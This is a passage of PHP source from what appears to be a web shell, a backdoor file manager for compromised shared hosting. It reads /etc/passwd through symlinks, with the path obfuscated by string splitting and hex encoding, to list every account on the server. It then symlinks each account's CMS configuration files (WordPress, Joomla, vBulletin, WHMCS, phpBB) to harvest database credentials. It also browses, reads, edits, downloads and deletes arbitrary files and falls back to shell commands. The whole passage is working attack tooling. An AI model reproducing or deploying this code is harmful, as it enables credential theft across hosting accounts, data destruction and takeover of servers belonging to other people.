								$content .= '<td><font color="white"><b>'.$data['name'].'</b></font></td>';
				
								$content .= '<td>'.$data['dir'].'</td>';
								$content .= '<td>'.(($this->is_path_readable($pathDirs)) ? '<font color=green>[<a href="?t-t&chdir='.$pathDirs.'" target="_blank"  style="text-decoration:none"><font color="white">&radic;</font></a>] Can read</font>':"<font color=red>[&chi;] Can't read</font>").'</td>';
								$content .= '<td align="center"><b>[ <font color="white">'.sizeof($data['dom']).'</font> ]</b>
												<select id="dom_link'.$u.'" style="border-style:none; width:200">';
							
								for($k=0; $k<sizeof($data['dom']); $k++)
									$content .= '<option value="http://'.$data['dom'][$k].'">'.$data['dom'][$k].'</option>';
									
								$content .= '</select><input type="button" value="View" style="border-style:none" 
												onclick="window.open(document.getElementById(\'dom_link'.$u.'\').value);"></td></tr>';
								$u++;
							}
						}
						$this->dPlay($content);
					}
				}
			}
			
			$content = '</table>';
			$this->dPlay($content);
		}
		private function get_user_dom($path) {
			$contStock = array();
			
			if($get = scandir($path.'/tmp/cpbandwidth')) {
				foreach($get as $dom) {
					if($dom != '.' && $dom != '..') {
						$dom_f=explode('-bytes',$dom);
						$contStock[] = $dom_f[0];
					}
				}
			}
			
			if($container = opendir($path.'/tmp/cpbandwidth')) {
				$newStock = array();
				
				while (false !== ($get = readdir($container)))
					$newStock[] = $get;
				sort($newStock);
				
				foreach($newStock as $dom) {
					if($dom != '.' && $dom != '..') {
						$dom_f=explode('-bytes',$dom);
						$contStock[] = $dom_f[0];
					}
				}
			}
			
			if(sizeof($contStock) > 0) {
				$contStock = array_unique($contStock);
			}else if(scandir($path.'/public_html') || opendir($path.'/public_html')) {	
				$contStock[] = "unknown:address";
			}else {
				$contStock[] = "about:blank";
			}
			
			return $contStock;
		}
		
		
		public function gen_sym($path, $starts, $ends) {
			if(function_exists("symlink")) {
				if(strlen($ends) == 0)
					return;
					
				$lnk = $this->str_fromArray($this->path_strip($path), "/", "path");
				$pawd= "";
				
				if(is_dir($lnk)) {
					$pawd = $lnk."/passwd";
					symlink("/et"."c/pa"."sswd", $pawd);
				}else {
					if(mkdir('asym')) {
						$lnk = $this->str_fromArray($this->path_strip(dirname(__FILE__)."/asym"), "/", "path");
						
						$pawd = $lnk."/passwd";
						symlink("/et"."c/pa"."sswd", $pawd);
					}else {
						$this->dPlay("<center>Warning: Directory can't be created.</center>");
						return;
					}
				}
					
				if(is_file($pawd)) {
					if(is_array($passwd = file($pawd))) {
						foreach($passwd as $usr) {
							$disUsr = explode(":", $usr);
			
							$data['lnk'] = $lnk;
							$data['name'] = $disUsr[0];
							$data['dir'] = $disUsr[5];
							$data['ends'] = $ends;
							
							if(strlen($starts) > 0)
								if(!$this->str_startsWith($starts, $data['dir']))
									continue;

							$this->gen_sym_list($data);
						}
					}
				}else {
					if(is_array($passwd = file($this->hexToStr('2f6574632f706173737764')))) {
						foreach($passwd as $usr) {
							$disUsr = explode(":", $usr);
								
							$data['lnk'] = $lnk;
							$data['name'] = $disUsr[0];
							$data['dir'] = $disUsr[5];
							$data['ends'] = $ends;
							
							if(strlen($starts) > 0)
								if(!$this->str_startsWith($starts, $data['dir']))
									continue;
							
							$this->gen_sym_list($data);
						}
					}
				}
			}else {
				$this->dPlay("<center>Warning: Function disabled.</center>");
			}
		}
		
		private function gen_sym_list($data) {
			symlink($data['dir'].$data['ends'].'/vb/includes/config.php', $data['lnk'].'/'.$data['name'].'~~vBulletin1.txt');
			symlink($data['dir'].$data['ends'].'/includes/config.php',$data['lnk'].'/'.$data['name'].'~~vBulletin2.txt');
			symlink($data['dir'].$data['ends'].'/forum/includes/config.php',$data['lnk'].'/'.$data['name'].'~~vBulletin3.txt');
			symlink($data['dir'].$data['ends'].'/cc/includes/config.php',$data['lnk'].'/'.$data['name'].'~~vBulletin4.txt');
			symlink($data['dir'].$data['ends'].'/config.php',$data['lnk'].'/'.$data['name'].'~~Phpbb1.txt');
			symlink($data['dir'].$data['ends'].'/forum/config.php',$data['lnk'].'/'.$data['name'].'~~Phpbb3.txt');
			symlink($data['dir'].$data['ends'].'/wp-config.php',$data['lnk'].'/'.$data['name'].'~~Wordpress1.txt');
			symlink($data['dir'].$data['ends'].'/blog/wp-config.php',$data['lnk'].'/'.$data['name'].'~~Wordpress2.txt');
			symlink($data['dir'].$data['ends'].'/configuration.php',$data['lnk'].'/'.$data['name'].'~~Joomla1.txt');
			symlink($data['dir'].$data['ends'].'/blog/configuration.php',$data['lnk'].'/'.$data['name'].'~~Joomla2.txt');
			symlink($data['dir'].$data['ends'].'/joomla/configuration.php',$data['lnk'].'/'.$data['name'].'~~Joomla3.txt');
			symlink($data['dir'].$data['ends'].'/whm/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm1.txt');
			symlink($data['dir'].$data['ends'].'/whmc/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm2.txt');
			symlink($data['dir'].$data['ends'].'/support/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm3.txt');
			symlink($data['dir'].$data['ends'].'/client/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm4.txt');
			symlink($data['dir'].$data['ends'].'/billings/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm5.txt');
			symlink($data['dir'].$data['ends'].'/billing/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm6.txt');
			symlink($data['dir'].$data['ends'].'/clients/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm7.txt');
			symlink($data['dir'].$data['ends'].'/whmcs/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm8.txt');
			symlink($data['dir'].$data['ends'].'/order/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm9.txt');
			symlink($data['dir'].$data['ends'].'/clienti/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm10.txt');
			symlink($data['dir'].$data['ends'].'/conf_global.php',$data['lnk'].'/'.$data['name'].'~~invisio.txt');
			symlink($data['dir'].$data['ends'].'/mk_conf.php',$data['lnk'].'/'.$data['name'].'~~mk-portale1.txt');
			symlink($data['dir'].$data['ends'].'/include/config.php',$data['lnk'].'/'.$data['name'].'~~12.txt');
			symlink($data['dir'].$data['ends'].'/settings.php',$data['lnk'].'/'.$data['name'].'~~Smf.txt');
			symlink($data['dir'].$data['ends'].'/includes/functions.php',$data['lnk'].'/'.$data['name'].'~~phpbb3.txt');
			symlink($data['dir'].$data['ends'].'/include/db.php',$data['lnk'].'/'.$data['name'].'~~infinity.txt');
		}
		
		public function whmcs() {
			
		}
		
		public function get_chdir() {
			$get_path = "";
			
			if(isset($_GET['chdir']))
				if(strlen($_GET['chdir']) > 0)
					$get_path = $_GET['chdir'];
				else
					$get_path = dirname(__FILE__);
			else
				if(isset($_SESSION['chdir'])) {
					$get_path = $_SESSION['chdir'];
				}else {
					$get_path = dirname(__FILE__);
				}
				
			
			$raw = $this->path_strip($get_path);

			$realPath = "";
			$realLink = '<a style="text-decoration:none;" href="?t-t&chdir=/"><font color="white">/Root/</font></a> ';
			for($i=0; $i<sizeof($raw); $i++) {
				$realPath .= "/".$raw[$i];
				$realLink .= '<a style="text-decoration:none;" href="?t-t&chdir='.$realPath.'"><font color="red">/'. $raw[$i] .'</font></a>';
			}
			$realLink .= ' <a style="text-decoration:none;" href="?t-t&chdir='.dirname(__FILE__).'"><font color="white">/Local/</font></a>';
			
			$this->dPlay('<table style="border-color:#9F0" bgcolor="#003366" width="100%" border="1"><tr><td style="border-style:groove;"><font color="#9999CC"><b>Path:</font>'.$realLink.'</b></td></tr></table>');
			$_SESSION['chdir'] = $realPath;
			if($this->is_path_readable($realPath))
				$this->show_chdir($realPath);
		}
		
		public function show_chdir($loc) {
			$content = "";
			$contStock = array();
			
			$contStock = $this->get_dir_contents($loc, 0);

			if(sizeof($contStock) > 0) {
				$content  = '<style>table.hov tr:hover, table.hov tr td:hover{background-color: #262626; }</style>';
				$content .= '<table class="hov" align=center style="border:solid, 1px; border-color:#FFFFFF" bgcolor="#111111" width="100%">
								<tr bgcolor="#262626">
									<td align=center><font color="#FF3300">Directories & Files</font></td>
									<td align=center><font color="#FF3300">Owner</font></td>
									<td align=center><font color="#FF3300">Size</font></td>
									<td align="center" colspan="3"><font color="#FF3300">Access</font></td>
									<td align=center><font color="#FF3300">Down</font></td>
									<td align=center><font color="#FF3300">Delete</font></td></tr>';	
				$this->dPlay($content);
				
				$content  = '';
				foreach($contStock as $nfd) {
					$path = $this->str_fromArray($this->path_strip($loc."/".$nfd), "/", "path");
	
					$content .= '<tr bgcolor="#000000">
									<td><a href="?t-t&chdir='.$path.'"><font color="#3366CC">';
									if($nfd == ".") $content .= '/.';
									else if($nfd == "..") $content .= '/..';
									else $content .= '/'.$nfd;
									$content .= '</font></a></td>
								<td width="10%" align="center">'.$this->format_fowner($path).'</td>
								<td width="80"></td>
								<td width="1%" align="center">'.$this->format_fperms($path,"t").'</td>
								<td width="85" align="center">'.$this->format_fperms($path,"l").'</td>
								<td width="1%" align="center">'.$this->format_fperms($path,"s").'</td>
								<td width="1%" align="center"></td>
								<td width="1%" align="center"><a href="javascript:void(0);"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7" onclick="ftp_file_delete(1, \''.$loc.'\', \''.$path.'\', \'POST\', \'rmdir\');"></a></td></tr>';	
				}
				$this->dPlay($content);
				
				$contStock = $this->get_dir_contents($loc, 1);
				$content  = '';
				foreach($contStock as $nfd) {
					$path = $this->str_fromArray($this->path_strip($loc."/".$nfd), "/", "path");
					
					$content .= '<tr><td><a href="?t-t&chdir='.$loc.'&file='.$path.'"><font color="#666699"> '.$nfd.'</font></a></td>
									<td width="1%" align="center">'.$this->format_fowner($path).'</td>
									<td align="right">'.$this->format_fsize($path).'</td>
									<td align="center">'.$this->format_fperms($path, "t").'</td>
									<td align="center">'.$this->format_fperms($path, "l").'</td>
									<td width="1%" align="center">'.$this->format_fperms($path,"s").'</td>
									<td width="1%" align="center"><a href="javascript:void(0);"><img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAABfUlEQVQ4y6WTv0tCURzFvwW9LCwpf9QS0Q8lcAmSGhoKBAuEVLBXm0PgUEIFQWEQ0hJNubi0tLb3B0RF1hINUkNbSW3vPTEaXPp2zyVDMbqBDz68wznf7+G+C4+YmZqh4Rk7IVNgfb9rkR6pHt8xWWec4/PP0zrgIVMWeHNkZisrnK7M8V5lQQIND5myYPSIzMOyzjulIO+W5iXQ8JApC4YOyNx/i/BmcZq3ijMSaHjIlAWDGTIzTyFeexjn1GNAAg0PmbJgYJus1J2f49dOXsp7JNDwkDUsaH7S+jfI6Fsnq8rqrZ/1C1Fw6ZZAw6udwQ52ZYltkpzupDh6IcggemXjxXwv6zcuCTS8ao5Z7NSdxDZBDleCjOVCL4fvWzlW6OK40AAaHjLMYPbX728bJkePTkby1cvhZ40jL3YJNDxkmPnzEjHQHSMj/THLoTJJoOEpl2tL7GEyspxgAP2f5Q6BR+ATTLVoFOsM0jsQOiq8gGBEgMtr/9lq9nf+AkHZVZaWnYt4AAAAAElFTkSuQmCC" onclick="ftp_file_download(\''.$path.'\');"></a></td>
										<td width="1%" align="center"><a href="javascript:void(0);"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7" onclick="ftp_file_delete(1, \''.$loc.'\', \''.$path.'\', \'POST\', \'rmfile\');"></a></td></tr>';	
				}
				$this->dPlay($content);

				$contStock = $this->get_dir_contents($loc, 2);
				$content  = '';
				foreach($contStock as $nfd) {
					$path = $this->str_fromArray($this->path_strip($loc."/".$nfd), "/", "path");
	
					$smpath = explode("public_html", $path);
					$tsmpath = $smpath[sizeof($smpath)-1];
					$sympath = 'http://'.$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'].$tsmpath;
	
					$content .= '<tr bgcolor="black"><td>';
									if($this->format_fperms($path, "r") == "r")
										$content .= '<a href="?t-t&chdir='.$loc.'&file='.$path.'">';
									else
										$content .= '<a href="'.$sympath.'" target="_blank">';
					$content .= '<font color="#FFFFFF"> '.$nfd.' => '.readlink($nfd).'</font></a></td>
									<td width="1%" align="center">'.$this->format_fowner($path).'</td>
									<td align="right">'.$this->format_fsize($path).'</td>
									<td align="center">'.$this->format_fperms($path, "tl").'</td>
									<td align="center">'.$this->format_fperms($path, "l").'</td>
									<td width="1%" align="center">'.$this->format_fperms($path,"s").'</td>
									<td width="1%" align="center"></td>
									<td width="1%" align="center"><a href="javascript:void(0);"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7" onclick="ftp_file_delete(1, \''.$loc.'\', \''.$path.'\', \'POST\', \'rmlink\');"></a></td></tr>';
				}
				$this->dPlay($content);
				
				$contStock = $this->get_dir_contents($loc, 3);
				$content  = '';
				foreach($contStock as $nfd) {
					$path = $this->str_fromArray($this->path_strip($loc."/".$nfd), "/", "path");
		
					$smpath = explode("public_html", $path);
					$tsmpath = $smpath[sizeof($smpath)-1];
					
					$sympath = 'http://'.$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'].$tsmpath;
	
					$content .= '<tr bgcolor="black"><td><a href="'.$sympath.'" target="_blank"><font color="#FFFFFF"> '.$nfd.' => '.readlink($nfd).'</font></a></td>
									<td width="1%" align="center">'.$this->format_fowner($path).'</td>
									<td align="right">'.$this->format_fsize($path).'</td>
									<td align="center">'.$this->format_fperms($path, "tl").'</td>
									<td align="center">'.$this->format_fperms($path, "l").'</td>
									<td width="1%" align="center">'.$this->format_fperms($path,"s").'</td>
									<td width="1%" align="center"></td>
									<td width="1%" align="center"><a href="javascript:void(0);"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7" onclick="ftp_file_delete(1, \''.$loc.'\', \''.$path.'\', \'POST\', \'rmunk\');"></a></td></tr>';
				}
	
				$content .= '</table>';
			}
			
				
			$this->dPlay($content);
		}
		
		/**************************************************************************************************/
		/**************************************************************************************************/
		function is_path_readable($path) {
			if($this->is_this_dir($path) && $this->format_fperms($path, "r") == 'r') {
				return true;	
			}
			return false;
		}
		
		function is_this_dir($path) {
			if($this->format_fperms($path, 't') == 'd') {
				return true;	
			}
			return false;
		}
		
		function is_this_file($path) {
			if($this->format_fperms($path, 't') == 'f') {
				return true;	
			}
			return false;
		}
		
		function is_this_link($path) {
			if($this->format_fperms($path, 't') == 'l') {
				return true;	
			}
			return false;
		}
		
		function is_this_unk($path) {
			if(!$this->is_this_dir($path) && !$this->is_this_file($path) && !$this->is_this_link($path)) {
				return true;
			}
			return false;
		}
		
		/**************************************************************************************************/
		/**************************************************************************************************/
		function get_dir_contents($path, $type = -1) {
			if(!$this->is_path_readable($path))
				return array();

			$case = 0;
			$temp = NULL;
			$contStock = array();
			$contTmp = array();
		
			if(function_exists("scandir") && ($temp = scandir($path)) !== false) {
				foreach($temp as $stock) {
					$tmp = $this->str_fromArray($this->path_strip($path."/".$stock), "/", "path");
					if($stock != "") {
						switch($type) {
							case 0: if($this->is_this_dir($tmp)) $contTmp[] = $stock; break;
							case 1: if($this->is_this_file($tmp)) $contTmp[] = $stock; break;
							case 2: if($this->is_this_link($tmp)) $contTmp[] = $stock; break;
							case 3: if($this->is_this_unk($tmp)) $contTmp[] = $stock; break;	
							default : $contTmp[] = $stock; break;
						}
					}
				}
			}
	
			if(sizeof($contTmp) > sizeof($contStock)) {
				$contStock = $contTmp;
				$contTmp = array();
				$case = 1;
			}
		
			$temp = NULL;
			$contTmp = array();
			if(function_exists("opendir") && ($temp = opendir($path)) !== false) {
				while(($stock = readdir($temp)) !== false) {
					$tmp = $this->str_fromArray($this->path_strip($path."/".$stock), "/", "path");
					if($stock != "") {
						switch($type) {
							case 0: if($this->is_this_dir($tmp)) $contTmp[] = $stock; break;
							case 1: if($this->is_this_file($tmp)) $contTmp[] = $stock; break;
							case 2: if($this->is_this_link($tmp)) $contTmp[] = $stock; break;
							case 3: if($this->is_this_unk($tmp)) $contTmp[] = $stock; break;		
							default : $contTmp[] = $stock; break;
						}
					}
				}
				sort($contTmp);
			}
		
			if(sizeof($contTmp) > sizeof($contStock)) {
				$contStock = $contTmp;
				$contTmp = array();
				$case = 2;
			}
	
			if(isset($_COOKIE['xallow']) && $_COOKIE['xallow'] == "null") {
				$temp = NULL;
				if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
					$temp = $this->do_through_shell("dir /A /B ".$path);
				}else {
					$temp = $this->do_through_shell("ls -a ".$path);
				}
				$tmp_array = explode("\n", $temp);
		
				$contTmp = array();
				foreach($tmp_array as $stock) {
					$tmp = $this->str_fromArray($this->path_strip($path."/".$stock), "/", "path");
					if($stock != "") {
						switch($type) {
							case 0: if($this->is_this_dir($tmp)) $contTmp[] = $stock; break;
							case 1: if($this->is_this_file($tmp)) $contTmp[] = $stock; break;
							case 2: if($this->is_this_link($tmp)) $contTmp[] = $stock; break;
							case 3: if($this->is_this_unk($tmp)) $contTmp[] = $stock; break;		
							default : $contTmp[] = $stock; break;
						}
					}
				}
				sort($contTmp);
				
				if(sizeof($contTmp) > sizeof($contStock)) {
					$contStock = $contTmp;
					$contTmp = array();
					$case = 3;
				}
			}
	
			return $contStock;
		}
		/**************************************************************************************************/
		/**************************************************************************************************/
			
		public function get_file() {
			if(isset($_GET['file']) && ($this->is_this_file($_GET['file']) || $this->is_this_link($_GET['file']))) 
				$_SESSION['file'] = $_GET['file'];
			else 
				$_SESSION['file'] = "";
				
			if(isset($_SESSION['file']) && strlen($_SESSION['file']) > 0)
				$this->read_file($_SESSION['file']);
		}
		
		public function read_file($file) {
			$content = "";
		
			$access = $this->format_fperms($file, "l");
			$stock = $this->get_file_content($file, false);

			$content .= "<table align=center width=80% bgcolor='#666666'><tr><td align=center bgcolor='black'><font color='#FF3300'>View File: </font><font color=green>{$file}</font> - <font color=white>";
			$content .= "[".$access."]";
			$content .= '</font></td></tr><tr><td align=center bgcolor="black">
						<textarea id="pad" cols=100 rows=25 style="border:double; border-color:#9F0">'.$stock.'</textarea></td></tr>
						<tr><td align=center bgcolor="black"><font color="green"><div id="info"><br></div></font></td></tr>
						<tr><td align=center bgcolor="black">
							<input align="left" type="button" value="Delete" onclick="ftp_file_delete(2, \''.$_SESSION['chdir'].'\', \''.$file.'\');">
							<input align="right" type="button" value="Save" onClick="ftp_file_save(\''.$_SESSION['chdir'].'\',\''.$file.'\');">
							</td></tr></table>';
			
			$this->dPlay($content);
		}
		
		function get_file_content($file, $linxarray) {
			$content = "";

			if($this->format_fperms($file, "r") == "r") {
				if(($stream = fopen($file, 'rb')) == true) {
					$content = stream_get_contents($stream);
					if(strlen($content) == 0) {
						$tfile = fopen($file, "r");
						$content = "";
						while(!feof($tfile))
							$content .= fgets($tfile);
						fclose($tfile);
					}
					
					if($linxarray) {
						$content = str_replace("<", "&lt;", $content);
						$content = str_replace(">", "&gt;", $content);
						
						$stock = explode("\n", $content);
						return $stock;
					}
				}else {
					$content = file_get_contents($file);
					if(strlen($content) == 0) {
						$tfile = fopen($file, "rb");
						$content = "";
						while(!feof($tfile))
							$content .= fgets($tfile);
						fclose($tfile);
					}

					if($linxarray) {
						$content = str_replace("<", "&lt;", $content);
						$content = str_replace(">", "&gt;", $content);
					
						$stock = explode("\n", $content);
						return $stock;
					}
				}
			}else {
				$content = `cat $file`;

				if(strlen($content) > 0) {
					if($linxarray) {
						$content = str_replace("<", "&lt;", $content);
						$content = str_replace(">", "&gt;", $content);
						
						$stock = explode("\n", $content);
						return $stock;
					}
				}
			}
			
			$content = str_replace("<", "&lt;", $content);
			$content = str_replace(">", "&gt;", $content);
			
			return $content;
		}
	
		function parse_file_contents($file) {
			$stock = "";
			
			$lineUnEcho = "";
			$lineNo = 1;
			
			$g_Com = false;
			$g_Parse = false;
			$g_MultiLine = false;
			
			while(!feof($file)) {
				$stock = fgets($file);
				$stock = str_replace("<?php", "&lt;?php", $stock);
				$stock = str_replace("<?", "&lt;?", $stock);
				$stock = str_replace("?>", "?&gt;", $stock);
				$stock = str_replace("<", "&lt;", $stock);
				$stock = str_replace(">", "&gt;", $stock);
				$stock = str_replace("	", "\t", $stock);
				
				$lineToStr = "[L][". (($lineNo<10000)?(($lineNo<1000)? (($lineNo<100)? (($lineNo<10)? "0000".$lineNo: "000".$lineNo) : "00".$lineNo): "0".$lineNo): $lineNo) ."] ";
				
				$lineResult = "";
				$g_EndLine = false;
				
				while(!$g_EndLine) {
					if($g_MultiLine) {
						$stf = explode("*/", $stock);
						if(sizeof($stf) == 2) {
							$stock = $lineUnEcho.$stf[1];
							$lineUnEcho = "";
							$g_MultiLine = false;
						}else 
							$g_EndLine = true;
						
					}else {
						if(stripos($stock ,"//") !== false && stripos($stock ,"/*") === false){
							$st = explode("//", $stock);
							$lineResult .= $st[0];
							$g_EndLine = true;
						}else if(stripos($stock ,"//") === false && stripos($stock ,"/*") !== false){
							$stA = explode("/*", $stock, 2);
							$lineResult .= $stA[0];
								
							$stB = explode("*/", $stock, 2);
							if(sizeof($stB) == 2)
								$stock = $stB[1];
							else {
								$lineUnEcho = $stA[0];
								$g_MultiLine = true;
								$g_EndLine = true;
							}
						}else if(stripos($stock ,"//") !== false && stripos($stock ,"/*") !== false){
							if(stripos($stock ,"//") < stripos($stock ,"/*")) {
								$st = explode("//", $stock);
								$lineResult .= $st[0];
								$g_EndLine = true;
							}else {
								$stA = explode("/*", $stock, 2);
								$lineResult .= $stA[0];
							
								$stB = explode("*/", $stA[1], 2);
								if(sizeof($stB) == 2)
									$stock = $stB[1];
								else {
									$lineUnEcho = $stA[0];
									$g_MultiLine = true;
									$g_EndLine = true;
								}
							}
						}else {
							$lineResult .= $stock;
							$g_EndLine = true;
						}
					}
				}
						
				if(!$g_MultiLine)
					echo $lineToStr ."<font color='yellow'>". $lineResult . " </font><br>";
				$lineNo++;	
			}
			
			return $stock;
		}
		
		public function exp_actions($from, $to="", $action, $rewrite=false) {
			$result = -1;
			switch($action) {
				case "copy":
					if(($this->is_this_file($from) && !$this->is_this_file($to)) || 
						($this->is_this_file($from) && $this->is_this_file($to) && $rewrite)) {
						if(copy($from, $to)) {
							$result = "0x0001";
						}else {
							$result = "1x0001";
						}
					}else {
						$result = "1x0011";	
					}
					break;
				case "rename":
					if(($this->is_this_file($from) && !$this->is_this_file($to)) || 
						($this->is_this_file($from) && $this->is_this_file($to) && $rewrite)) {
						if(rename($from, $to)) {
							$result = "0x0002";
						}else {
							$result = "1x0002";
						}
					}else {
						$result = "1x0012";	
					}
					break;
				case "save":
					if(!$this->is_this_file($to)) {
						if(!$this->is_this_dir(dirname($to))) {
							$this->exp_actions(_, dirname($to), "mkdir", _);
							$result = "0x0003";
						}
					}
					
					$save = @fopen($to, 'w') or die("<center>1x0003: Can't open file !</center>");
					fwrite($save, $NVShl->hexToStr($from));
					fclose($save);
					
					break;
				case "rmdir":
					$get_dir = $this->get_dir_contents($from, 0);
					foreach($get_dir as $dir) {
						$nextDir = $this->str_fromArray($this->path_strip($from."/".$dir), "/", "path");
						if($dir != "." &&  $dir != "..")
							$this->exp_actions($nextDir, _, "rmdir", _);
					}

					$get_file = $this->get_dir_contents($from, 1);
					foreach($get_file as $file) { 
						$nextFile = $this->str_fromArray($this->path_strip($from."/".$file), "/", "path");
						$this->exp_actions($nextFile, _, "rmfile", _);
					}

					$get_link = $this->get_dir_contents($from, 2);
					foreach($get_link as $link) {
						$nextLink = $this->str_fromArray($this->path_strip($from."/".$link), "/", "path");
						$this->exp_actions($nextLink, _, "rmlink", _);
					}

					$get_unk = $this->get_dir_contents($from, 3);
					foreach($get_unk as $unk) { 
						$nextUnk = $this->str_fromArray($this->path_strip($from."/".$unk), "/", "path");
						$this->exp_actions($nextUnk, _, "rmunk", _);
					}
					$result = rmdir($from); 

					break;
				case "rmfile": case "rmlink": case "rmunk":
					if($this->is_this_file($from) || $this->is_this_link($from) || $this->is_this_unk($from))
						$result = unlink($from);
					break;
				case "mkdir":
					if(!$this->is_this_dir($to)) {
						mkdir($from);
						$result = "0x0006";
					}else {
						$result = "1x0006";
					}
					break;	
				case "mkfile":
					if(!$this->is_this_file($to) || (!$this->is_this_file($to) && $rewrite)) {
						$hdl = fopen($to, "w");
						fclose($hdl);
						$result = "0x0007";
					}else {
						$result = "1x0007";
					}
					break;	
				case "download":
					if($this->is_this_file($from)) {
						$filename = pathinfo($from, PATHINFO_BASENAME);
						header('Content-disposition: attachment; filename="'. $filename .'"');
						header('Content-type: application/octet-stream');
						readfile($from);
						$result = "0x0008";
					}else {
						$result = "1x0008";
					}
					break;
				case "zip":
				
					break;
				case "upload":
					break;
				default:break;
			}
			
			return $result;
		}
	
		
		function format_fowner($path) {
			if(function_exists("posix_getpwuid"))
				$flowner = posix_getpwuid(fileowner($path));
			else 
				$flowner['name'] = "??? = ".fileowner($path);
			return $flowner['name'];
		}
		
		function format_fsize($path) {
			if(!is_file($path)) return "0 By";
			
			$size = "";
			$type = 0;
			
			$sz = filesize($path);
			
			while($sz > 1024) {
				$sz/=1024;
				$type++;
			}
			
			switch($type) {
				case 1: $size .= number_format($sz, 2)." Kb"; break;
				case 2: $size .= number_format($sz, 2)." Mb"; break;
				case 3: $size .= number_format($sz, 2)." Gb"; break;
				case 4: $size .= number_format($sz, 2)." Tb"; break;
				default: $size .= number_format($sz, 2)." By";
			}
			
			return $size;
		}
		
		function format_fperms($path, $type) {
			$access = '';
			$perms = fileperms($path);
	
			switch($type) {
				case 'l':
					// Owner
					$access .= (($perms & 0x0100) ? 'r' : '-');
					$access .= (($perms & 0x0080) ? 'w' : '-');
					$access .= (($perms & 0x0040) ? (($perms & 0x0800)?'s':'x') : (($perms & 0x0800)?'S':'-'));
					$access .= " ";
					// Group
					$access .= (($perms & 0x0020) ? 'r' : '-');
					$access .= (($perms & 0x0010) ? 'w' : '-');
					$access .= (($perms & 0x0008) ? (($perms & 0x0400)?'s':'x') : (($perms & 0x0400)?'S':'-'));
					$access .= " ";
					// Others
					$access .= (($perms & 0x0004) ? 'r' : '-');
					$access .= (($perms & 0x0002) ? 'w' : '-');
